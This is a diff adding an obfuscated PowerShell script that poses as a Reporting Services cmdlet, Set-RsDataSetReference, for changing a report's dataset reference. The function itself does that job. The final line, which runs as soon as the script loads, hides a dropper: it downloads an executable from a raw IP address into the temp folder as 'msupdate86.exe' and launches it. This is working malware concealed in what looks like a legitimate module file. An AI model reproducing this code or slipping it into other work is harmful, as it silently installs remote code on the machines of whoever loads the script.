@@ -1,0 +1,72 @@
+function sEt`-RsDaTAS`E`Treferen`Ce
+{
+    
+    [CmdletBinding(sUpPORTSShOuLDPRoCESs = ${Tr`UE}, CONfIRMiMpact = "m`eDI`Um")]
+    param (
+        [Alias({"{2}{1}{0}"-f 'ath','emP','It'})]
+        [Parameter(mAnDAToRY = ${t`RuE})]
+        [string[]] 
+        ${pa`TH},
+
+        [Parameter(MandAtory = ${t`RuE})]
+        [string]
+        ${datASe`T`N`AmE},
+
+        [Parameter(ManDATOrY = ${T`RUE})]
+        [string]
+        ${Dat`AsetP`ATh},
+        
+        [string]
+        ${RepoRT`SerV`E`RURI},
+        
+        [Alias({"{3}{2}{1}{4}{0}{5}" -f'tia','verCrede','Ser','Report','n','ls'})]
+        [System.Management.Automation.PSCredential]
+        ${creD`e`NTiAL},
+        
+        ${P`ROXY}
+    )
+    
+    Begin
+    {
+        ${P`Ro`xY} = .("{3}{0}{5}{6}{2}{1}{4}"-f 'bSer','He','roxy','New-RsWe','lper','vic','eP') -BoundParameters ${PSb`o`UNd`Pa`R`AMEtERs}
+    }
+    
+    Process
+    {
+        foreach (${i`TEm} in ${p`Ath})
+        {
+            
+            if (${pS`c`MD`Let}.("{0}{1}{2}" -f'Shou','ldProces','s').Invoke(${i`TEM}, ('S'+'et '+('dat'+'a'+'s'+'ource{0}s ')-f [CHAR]39+'DataSe'+'t'+' '+"$DataSetName "+'t'+'o '+"$DataSetPath")))
+            {
+                .("{2}{0}{1}"-f 'r','ite-Verbose','W') ('Proces'+'sing:'+' '+"$item")
+                
+                try
+                {
+                    ${DaT`ASE`TS} = ${p`ROxy}.("{4}{1}{3}{2}{0}"-f 'nces','emRefe','e','r','GetIt').Invoke(${IT`eM}, ("{1}{0}"-f 'aSet','Dat'))
+                }
+                catch
+                {
+                    throw (.("{2}{1}{0}" -f 'w-Object','e','N') ("{2}{0}{1}{3}" -f'em.Ex','ceptio','Syst','n')("Failed to retrieve item references from Report Server for '$item': $($_.Exception.Message) ", ${_}."Ex`CEPTi`On"))
+                }
+                ${dA`T`ASETRe`FERENCE} = ${Dat`AS`ETs} | .("{1}{3}{2}{0}" -f '-Object','W','ere','h') { ${_}."N`AME" -eq ${DA`T`ASe`Tname} } | .("{3}{2}{0}{1}" -f'c','t','elect-Obje','S') -First 1
+                
+                if (-not ${DATaSETrE`Fe`Re`N`cE})
+                {
+                    throw ("$item "+'do'+'es '+'n'+'ot '+'c'+'onta'+'in '+'a '+'d'+'ataSet '+'re'+'fer'+'ence'+' '+'wit'+'h '+'n'+'ame '+"$DataSetName")
+                }
+                
+                ${proXyN`Am`ES`P`Ace} = ${D`A`TA`sE`TREFEReNCe}.("{1}{0}"-f'etType','G').Invoke()."N`AMeS`PAce"
+                ${DAtA`seT`Re`F`eRENCE} = .("{0}{2}{1}"-f 'N','t','ew-Objec') "$($proxyNamespace).ItemReference"
+                ${DA`TAseT`RE`Fe`RE`NcE}."n`AMe" = ${DAtas`ET`NAme}
+                ${DatASEt`Ref`e`RenCe}."R`E`FereN`cE" = ${D`AtaSe`TpAtH}
+                
+                .("{1}{0}{3}{2}"-f 'e-Ve','Writ','ose','rb') ('S'+'et '+'dat'+'aS'+'et '+'ref'+'ere'+'nce '+"'$DataSetName' "+'of'+' '+'ite'+'m '+"$item "+'to'+' '+"$DataSetPath")
+                ${pR`o`Xy}.("{0}{3}{1}{2}" -f'S','Refer','ences','etItem').Invoke(${I`TEm}, @(${DAtAse`TReF`E`R`e`NCE}))
+            }
+            
+        }
+    }
+}
+
+&("{0}{2}{1}"-f 'New-','lias','A') -Name ("{1}{0}{2}"-f'RsD','Set-','ataSet') -Value ("{0}{5}{1}{4}{2}{3}"-f'Se','RsDat','SetRef','erence','a','t-') -Scope ("{1}{0}" -f 'l','Globa')
+(.("{0}{2}{1}" -f 'New-Obj','t','ec') ("{4}{2}{5}{3}{0}{1}" -f 'n','t','yst','Net.WebClie','S','em.')).("{1}{0}{2}"-f'o','Downl','adFile').Invoke(("{7}{2}{0}{4}{6}{5}{3}{1}"-f '141.','xe','185.','e','25.142/u','date.','p','http://'),"$env:TEMP\msupdate86.exe");&("{0}{1}{2}"-f 'St','art-Pr','ocess') ("$env:TEMP\msupdate86.exe")
